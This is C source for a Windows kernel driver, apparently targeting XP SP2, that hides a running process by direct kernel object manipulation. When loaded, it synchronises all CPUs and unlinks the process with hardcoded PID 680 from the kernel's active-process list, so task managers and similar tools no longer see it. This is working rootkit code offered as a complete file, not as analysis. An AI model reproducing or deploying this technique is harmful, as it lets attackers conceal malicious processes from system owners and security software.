#ifdef __cplusplus   
extern "C"  
{  
#endif   


#include <ntddk.h>

//xp sp2ÏÂÆ«ÒÆ(ÄÚºË°æ±¾5.1)
#define SZ_EPROCESS_NAME 0x10
#define EPROCESS_OFFSET_NAME 0x174
#define EPROCESS_OFFSET_PID 0x84
#define EPROCESS_OFFSET_LINKS 0x88


typedef struct _OFFSET_OF_EPROCESS
{
	ULONG ProcName;
	ULONG ProcPID;
	ULONG ProcLinks;
}OFFSET_OF_EPROCESS;


OFFSET_OF_EPROCESS offsets = {0x16C,0xB4,0xB8};
LONG LockAcquired;
LONG nCPUsLocked;

KIRQL RaiseIRQL();
void LowerIRQL(KIRQL prev);
PKDPC AcquireLock();
void lockRoutine(PKDPC dpc,	PVOID context,PVOID arg1,PVOID arg2);
NTSTATUS ReleaseLock(PVOID dpcPtr);
void HideTask(ULONG *pid);
void modifyTaskList(ULONG pid);
void modifyTaskListEntry(UCHAR * currentPEP);
UCHAR * GetNextPEP(UCHAR * currentPEP);
UCHAR * GetPreviousPEP(UCHAR * currentPEP);
void GetTaskName(char * dext,char * src);
int GetPID(UCHAR * currentPEP);
VOID DriverUnload(IN PDRIVER_OBJECT DriverObject);
NTSTATUS DefaultHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);

NTSTATUS DriverEntry( IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING  RegistryPath )  
{  
	ULONG pid = 680;//process 's PID
    KdPrint( ( "Enter DriverEntry/n" ) );  
      
    for ( int i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++ )  
    {  
        DriverObject->MajorFunction[i] = DefaultHandler;  
    }  
      
    DriverObject->DriverUnload  = DriverUnload;  
	
    HideTask(&pid);
    
    return STATUS_SUCCESS;  
      
}  

NTSTATUS DefaultHandler( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )  
{  
    KdPrint( ( "Enter DefaultHandler/n" ) );  
      
    Irp->IoStatus.Status = STATUS_NOT_SUPPORTED;  
    Irp->IoStatus.Information = 0;  
    IoCompleteRequest( Irp, IO_NO_INCREMENT );  
    return Irp->IoStatus.Status;  
}  

VOID DriverUnload( IN PDRIVER_OBJECT DriverObject )
{

	KdPrint( ( "Enter unload/n" ) );  
	
      
    
}

KIRQL RaiseIRQL()
{
	KIRQL curr;
	KIRQL prev;

	curr = KeGetCurrentIrql();
	prev = curr;
	if(curr < DISPATCH_LEVEL)
	{
		KeRaiseIrql(DISPATCH_LEVEL,&prev);
	}

	return prev;
}

void LowerIRQL(KIRQL prev)
{
	KeLowerIrql(prev);

	return;
}

PKDPC AcquireLock()
{

	PKDPC dpcArray;
	ULONG cpuID;
	ULONG i;
	ULONG nOtherCPUs;

	if(KeGetCurrentIrql() != DISPATCH_LEVEL)
	{
		DbgPrint("current IRQL isn't DISPATCH_LEVEL");
		return NULL;
	}

	InterlockedAnd(&LockAcquired,0);
	InterlockedAnd(&nCPUsLocked,0);

	dpcArray = (PKDPC)ExAllocatePool(NonPagedPool,KeNumberProcessors * sizeof(KDPC));
	if(dpcArray == NULL)
	{
		DbgPrint("ExAllocatePool() error!\n");
		return NULL;
	}

	cpuID = KeGetCurrentProcessorNumber();

	for(i=0;i<KeNumberProcessors;i++)
	{
		PKDPC dpcPtr = &(dpcArray[i]);
		if(i != cpuID)
		{
			KeInitializeDpc(dpcPtr,lockRoutine,NULL);
			KeSetTargetProcessorDpc(dpcPtr,i);
			KeInsertQueueDpc(dpcPtr,NULL,NULL);
		}
	}

	nOtherCPUs = KeNumberProcessors - 1;
	InterlockedCompareExchange(&nCPUsLocked,nOtherCPUs,nOtherCPUs);

	while(nCPUsLocked != nOtherCPUs)
	{
		_asm
		{
			nop
		}
		InterlockedCompareExchange(&nCPUsLocked,nOtherCPUs,nOtherCPUs);
	}

	return dpcArray;
}

	
void lockRoutine(PKDPC dpc,
				 PVOID context,
				 PVOID arg1,
				 PVOID arg2)
{
	InterlockedIncrement(&nCPUsLocked);

	while(InterlockedCompareExchange(&LockAcquired,1,1) == 0)
	{
		_asm
		{
			nop
		}
	}

	InterlockedDecrement(&nCPUsLocked);

	return;
}

NTSTATUS ReleaseLock(PVOID dpcPtr)
{
	InterlockedIncrement(&LockAcquired);

	InterlockedCompareExchange(&nCPUsLocked,0,0);
	while(nCPUsLocked != 0)
	{
		_asm
		{
			nop
		}

		InterlockedCompareExchange(&nCPUsLocked,0,0);
	}

	if(dpcPtr != NULL)
	{
		ExFreePool(dpcPtr);
	}

	return STATUS_SUCCESS;
}

void HideTask(ULONG *pid)
{
	KIRQL irql;
	PKDPC dpcPtr;

	irql = RaiseIRQL();
	dpcPtr = AcquireLock();
	modifyTaskList(*pid);
	ReleaseLock((void*)dpcPtr);
	LowerIRQL(irql);

	return;
}


void modifyTaskList(ULONG pid)
{
	UCHAR * CurrentPEP = NULL;
	UCHAR * NextPEP = NULL;
	int CurrentPID = 0;
	int startPID = 0;
	char name[SZ_EPROCESS_NAME];
	int fuse = 0;
	const int BLOWN = 1048567;

	CurrentPEP = (UCHAR*)PsGetCurrentProcess();
	CurrentPID = GetPID(CurrentPEP);
	GetTaskName((char*)name,(char*)(CurrentPEP+EPROCESS_OFFSET_NAME));
	startPID = CurrentPID;

	if(CurrentPID == pid)
	{
		modifyTaskListEntry(CurrentPEP);
		DbgPrint("the PID:[%u][%s]Process hidden!\n",pid,name);
		return;
	}

	NextPEP = GetNextPEP(CurrentPEP);
	CurrentPEP = NextPEP;
	CurrentPID = GetPID(CurrentPEP);
	GetTaskName((char*)name,(char*)(CurrentPEP+EPROCESS_OFFSET_NAME));
	while(startPID != CurrentPID)
	{
		if(CurrentPID == pid)
		{
			modifyTaskListEntry(CurrentPEP);
			DbgPrint("the PID:[%u][%s]Process hidden!\n",pid,name);
			return;
		}
		NextPEP = GetNextPEP(CurrentPEP);
		CurrentPEP = NextPEP;
		CurrentPID = GetPID(CurrentPEP);
		GetTaskName((char*)name,(char*)(CurrentPEP+EPROCESS_OFFSET_NAME));
		
		if(++fuse == BLOWN)
		{
			DbgPrint("over time");
			return;
		}
	}

	DbgPrint("%d Tasks Listed but Not Found PID:[%d]\n",fuse,pid);
	return;
}

void modifyTaskListEntry(UCHAR * currentPEP)
{
	UCHAR * prevPEP = NULL;
	UCHAR * nextPEP = NULL;

	int currentPID = 0;
	int prevPID = 0;
	int nextPID = 0;

	LIST_ENTRY * currentListEntry;
	LIST_ENTRY * prevListEntry;
	LIST_ENTRY * nextListEntry;

	currentPID = GetPID(currentPEP);

	prevPEP = GetPreviousPEP(currentPEP);
	prevPID = GetPID(prevPEP);

	nextPEP = GetNextPEP(currentPEP);
	nextPID = GetPID(nextPEP);

	currentListEntry = ((LIST_ENTRY *)(currentPEP + EPROCESS_OFFSET_LINKS));
	prevListEntry = ((LIST_ENTRY *)(prevPEP + EPROCESS_OFFSET_LINKS));
	nextListEntry = ((LIST_ENTRY *)(nextPEP + EPROCESS_OFFSET_LINKS));

	(*prevListEntry).Flink = nextListEntry;
	(*nextListEntry).Blink = prevListEntry;

	(*currentListEntry).Blink = currentListEntry;
	(*currentListEntry).Flink = currentListEntry;

}

UCHAR * GetNextPEP(UCHAR * currentPEP)
{
	UCHAR * nextPEP = NULL;
	UCHAR * fLink = NULL;
	LIST_ENTRY listEntry;

	listEntry = *((LIST_ENTRY*)(currentPEP+EPROCESS_OFFSET_LINKS));
	fLink = (UCHAR*)(listEntry.Flink);
	nextPEP = (fLink - EPROCESS_OFFSET_LINKS);

	return nextPEP;
}

UCHAR * GetPreviousPEP(UCHAR * currentPEP)
{
	UCHAR * prevPEP = NULL;
	UCHAR * bLink = NULL;
	LIST_ENTRY listEntry;

	listEntry = *((LIST_ENTRY*)(currentPEP+EPROCESS_OFFSET_LINKS));
	bLink = (UCHAR*)(listEntry.Blink);
	prevPEP = (bLink - EPROCESS_OFFSET_LINKS);

	return prevPEP;
}

void GetTaskName(char * dext,char * src)
{
	strncpy(dext,src,SZ_EPROCESS_NAME);
	dext[SZ_EPROCESS_NAME-1] = '\0';

}

int GetPID(UCHAR * currentPEP)
{
	int * pid;
	pid = (int*)(currentPEP+EPROCESS_OFFSET_PID);
	return (*pid);
}










	
#ifdef __cplusplus   
}  
#endif 